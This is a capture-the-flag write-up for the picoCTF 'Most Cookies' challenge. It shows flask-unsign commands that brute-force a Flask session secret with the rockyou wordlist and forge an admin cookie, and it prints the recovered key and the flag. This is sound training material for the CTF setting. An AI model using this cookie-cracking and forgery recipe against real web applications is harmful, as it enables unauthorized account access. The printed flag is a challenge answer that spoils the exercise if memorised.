# Most Cookies
# Category
Web Exploitation
# Problem Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:6259/
# Approach
I searched google for flask cookies exploits and found this website - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask.<br>
To find the secret key I used bruteforce.

```
flask-unsign --wordlist rockyou.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y-SaZg.M7bMpKEroMAbSnhqh193faXIN3U' --no-literal-eval
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 39424 attempts
b'gingersnap'
```

The secret key is gingersnap.<br>
To generate the session cookie for admin I used the following command.

```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'gingersnap'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Y-SfuA.ylZIpuFcUeUW2K8u_VVmSR0YbEs
```
Popping `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Y-SfuA.ylZIpuFcUeUW2K8u_VVmSR0YbEs` into the cookie value I get the flag.
# Flag
picoCTF{pwn_4ll_th3_cook1E5_5f016958}
